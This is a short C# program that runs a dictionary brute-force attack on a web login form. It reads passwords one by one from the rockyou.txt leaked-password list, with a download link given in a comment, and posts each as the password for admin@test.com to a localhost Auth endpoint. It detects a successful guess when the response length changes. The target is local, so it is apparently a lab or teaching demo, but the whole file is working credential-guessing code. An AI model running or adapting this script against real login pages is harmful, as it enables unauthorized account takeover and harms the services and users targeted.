const string url = "https://localhost:7171/Auth/Index";
var prevLength = 0;

// DOWNLOAD: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

foreach (var password in File.ReadLines(@"PATH-TO-rockyou.txt"))
{
    using var client = new HttpClient();

    var content = new FormUrlEncodedContent(new[]
    {
        new KeyValuePair<string, string>("username", "admin@test.com"),
        new KeyValuePair<string, string>("password", password)
    });

    var response = await client.PostAsync(url, content);

    var result = await response.Content.ReadAsStringAsync();


    Console.WriteLine($"The password used was {password} generated {result.Length} characters.");

    if (prevLength != result.Length && prevLength != 0)
    {
        Console.WriteLine($"Password used is: '{password}'");
        Console.ReadLine();
    }

    prevLength = result.Length;
}